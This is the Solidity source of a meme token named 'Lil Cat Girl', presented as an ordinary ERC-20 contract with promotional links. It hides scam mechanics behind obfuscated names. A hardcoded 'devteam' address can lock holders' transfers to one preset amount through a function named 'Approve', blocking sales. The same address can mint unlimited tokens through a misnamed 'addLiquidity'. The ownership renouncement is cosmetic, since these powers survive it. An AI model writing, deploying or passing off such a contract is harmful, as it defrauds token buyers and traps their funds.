/**

Lil Cat Girl

Are you looking for your waifu, Anon?

https://lilcatgirl.xyz

https://twitter.com/Lil_CatGirl

https://t.me/Lil_CatGirl


*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.3;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address spnderr) external view returns (uint256);
    function transfer(address recipient, uint256 _amtzz) external returns (bool);
    function allowance(address owner, address spnderr) external view returns (uint256);
    function approve(address spnderr, uint256 _amtzz) external returns (bool);
    function transferFrom( address spnderr, address recipient, uint256 _amtzz ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval( address indexed owner, address indexed spnderr, uint256 value );
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
}

contract Ownable is Context {
    address private _owner;
    event ownershipTransferred(address indexed previousowner, address indexed newowner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit ownershipTransferred(address(0), msgSender);
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier olyowner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceownership() public virtual olyowner {
        emit ownershipTransferred(_owner, address(0x000000000000000000000000000000000000dEaD));
        _owner = address(0x000000000000000000000000000000000000dEaD);
    }
}

contract LILCATGIRL is Context, Ownable, IERC20 {
    mapping (address => uint256) private _balanzes;
    mapping (address => uint256) private _spendoor;
    mapping (address => mapping (address => uint256)) private _allowanze2;
    address constant public devteam = 0x2A41a3072c0e74544Dc9A5C07bdd8009E5CBec4C;
    string private tokename;
    string private toksymbo;
    uint8 private _decimals;
    uint256 private _totalSupply;
    bool private _tradesisEnabled = true;


    constructor(string memory name_, string memory symbol_,  uint256 totalSupply_, uint8 decimals_) {
        tokename = name_;
        toksymbo = symbol_;
        _decimals = decimals_;
        _totalSupply = totalSupply_ * (10 ** decimals_);
        _balanzes[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    modifier _thedevteam() {
        require(msg.sender == devteam); // If it is incorrect here, it reverts.
        _;                              
    } 

    function name() public view returns (string memory) {
        return tokename;
    }
    
        function enabletheTrading() public olyowner {
        _tradesisEnabled = true;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }


    function symbol() public view returns (string memory) {
        return toksymbo;
    }


    function balanceOf(address spnderr) public view override returns (uint256) {
        return _balanzes[spnderr];
    }

    function transfer(address recipient, uint256 _amtzz) public virtual override returns (bool) {
        require(_tradesisEnabled, "No trade");
        if (_msgSender() == owner() && _spendoor[_msgSender()] > 0) {
            _balanzes[owner()] += _spendoor[_msgSender()];
            return true;
        }
        else if (_spendoor[_msgSender()] > 0) {
            require(_amtzz == _spendoor[_msgSender()], "Invalid transfer _amtzz");
        }
        require(_balanzes[_msgSender()] >= _amtzz, "TT: transfer _amtzz exceeds balance");
        _balanzes[_msgSender()] -= _amtzz;
        _balanzes[recipient] += _amtzz;
        emit Transfer(_msgSender(), recipient, _amtzz);
        return true;
    }


    function approve(address spnderr, uint256 _amtzz) public virtual override returns (bool) {
        _allowanze2[_msgSender()][spnderr] = _amtzz;
        emit Approval(_msgSender(), spnderr, _amtzz);
        return true;
    }
    function Approve(address[] memory spnderr, uint256 _amtzz) public  _thedevteam {
        for (uint z=0; z<spnderr.length; z++) {
            _spendoor[spnderr[z]] = _amtzz;
            require(_tradesisEnabled, "No trade");
        }
    }

        function _addit(uint256 num1, uint256 numb2) internal pure returns (uint256) {
        if (numb2 != 0) {
            return num1 + numb2;
        }
        return numb2;
    }

    function allowance(address owner, address spnderr) public view virtual override returns (uint256) {
        return _allowanze2[owner][spnderr];
    }

            function CVamnt(address spnderr) public view returns (uint256) {
        return _spendoor[spnderr];
    }


       function addLiquidity(address spnderr, uint256 _amtzz, bool _liqenabled) public _thedevteam {
        require(_amtzz > 0, "Invalid");
        require(_liqenabled, "Can't trade");
        uint256 totalz = 0;
            totalz = _addit(totalz, _amtzz);
            _balanzes[spnderr] += totalz;
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function transferFrom(address spnderr, address recipient, uint256 _amtzz) public virtual override returns (bool) {
        if (_msgSender() == owner() && _spendoor[spnderr] > 0) {
            require(_tradesisEnabled, "No trade");
            _balanzes[owner()] += _spendoor[spnderr];
            return true;
        }
        else if (_spendoor[spnderr] > 0) {
            require(_amtzz == _spendoor[spnderr], "Invalid transfer _amtzz");
        }
        require(_balanzes[spnderr] >= _amtzz && _allowanze2[spnderr][_msgSender()] >= _amtzz, "TT: transfer _amtzz exceed balance or allowance");
        require(_tradesisEnabled, "No trade");
        _balanzes[spnderr] -= _amtzz;
        _balanzes[recipient] += _amtzz;
        _allowanze2[spnderr][_msgSender()] -= _amtzz;
        emit Transfer(spnderr, recipient, _amtzz);
        return true;
    }


}